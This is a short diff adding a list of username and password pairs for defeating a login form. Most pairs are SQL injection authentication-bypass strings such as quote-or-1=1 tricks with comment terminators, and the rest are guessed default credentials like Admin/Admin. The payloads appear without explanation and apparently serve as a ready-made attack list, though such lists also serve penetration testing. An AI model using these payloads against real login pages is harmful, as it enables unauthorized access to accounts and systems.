@@ -1,0 +1,14 @@
+Username: ‘=”or’
+Password: ‘=”or’
+--------------------------
+Username : ‘ or 1=1 limit 1 — -+
+Password : ‘ or 1=1 limit 1 — -+
+--------------------------
+Username: Admin123
+Password: Admin123
+--------------------------
+Username: Admin
+Password: Admin
+--------------------------
+Username: admin' or '1'='1'/*
+Password: admin' or '1'='1'/*
